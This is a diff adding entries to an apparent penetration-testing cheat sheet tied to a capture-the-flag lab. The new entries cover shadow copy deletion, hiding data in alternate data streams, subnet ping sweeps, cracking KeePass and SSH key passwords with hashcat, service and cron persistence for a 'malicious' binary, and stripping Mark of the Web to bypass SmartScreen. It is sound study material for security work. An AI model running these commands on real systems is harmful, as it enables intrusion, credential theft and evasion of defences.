@@ -1509,4 +1509,44 @@ bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove 
 
 ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName | grep "sAMAccountName:" | cut -d " " -f 2 > usernames.txt	# List users 
 
+# SHADOW COPIES
+vssadmin create shadow /for=C:	# Shadow Create a snapshot
+wmic shadowcopy call create Volume='C:\'	# Create snapshot by using WMIC
+vssadmin delete shadows /for=C: /all	# Delete a snapshot
+vssadmin list shadows	# Check bestaande shapshots
+
+# ALTERNATE DATA STREAMS
+file.txt:stream_name	# file.txt: Main file content | stream_name: The hidden data attached to the file	ALTERNATE DATA STREAMS
+echo Hidden content > file.txt:hidden	# Write ALTERNATE DATA STREAMS
+more < file.txt:hidden	# Read ALTERNATE DATA STREAMS
+dir /R	# Checking with CMD	# ALTERNATE DATA STREAMS
+Get-Item -Path .\file.txt -Stream *	# Checking with Powershell	# ALTERNATE DATA STREAMS
+
+
+for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.	# x24 subnet pingsweep - Windows: Finding hosts inside an internal network:
+for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done	# x24 subnet pingsweep - Linux Finding hosts inside an internal network:
+for /l %i in (0,1,255) do for /l %j in (0,1,255) do ping -n 1 -w 500 192.168.%i.%j | find "Reply from"	# x16 subnet pingsweep - Windows: Finding hosts inside an internal network:
+for i in {0..255}; do for j in {0..255}; do ping -c 1 -W 1 192.168.$i.$j | grep "64 bytes" & done; wait; done	# x16 subnet pingsweep - Linux Finding hosts inside an internal network:
+nmap -Pn -sP 192.168.0.0/16	# Nmap NoPing pingsweep # Finding hosts inside an internal network:
+
+
+# Password Manager Key Files Attacks
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue	# Locate the KeePass database (.kdbx file)	#Password Manager Key Files Attacks
+keepass2john Database.kdbx > keepass.hash	# Extract the Hash of the Master Password: Hash format: %username%:%hash% #Password Manager Key Files Attacks
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt	# Crack	Password Manager Key Files Attacks
+
+# Extracting password from private SSH keys
+ssh2john id_rsa > ssh.hash	# Extract the password hash from the private key: removing the "id_rsa:" as the "username", so that the hash starts with "$sshng"
+hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt --force	# Cracking the Password with Hashcat:
+
+
+# WINDOWS PERSISTENCE
+sc create MaliciousService binPath= "C:\path\to\malicious.exe" start= auto	# sc command to create a new service	# WINDOWS PERSISTENCE
+New-Service -Name "MaliciousService" -Binary "C:\path\to\malicious.exe" -StartupType "Automatic"	#  PowerShell to create and configure the service	# WINDOWS PERSISTENCE
+Set-Content -Path "C:\Users\mrbas\Desktop\Test\Downloaded.pdf" -Stream Zone.Identifier -Value "[ZoneTransfer]`nZoneId=1"	#  change the ZoneID to remove the "Mark of the Web“ (and avoid SmartScreen): # POWERSHELL	# WINDOWS PERSISTENCE
+
+# LINUX PERSISTENCE
+echo "@reboot /tmp/malicious.sh" >> /var/spool/cron/crontabs/$USER	# User-level Cron: Create the CRON job to run at boot 
+echo "@reboot root /path/to/malicious.sh" >> /etc/crontab	# System-wide Cron: Create the CRON job to run at boot:
+
 
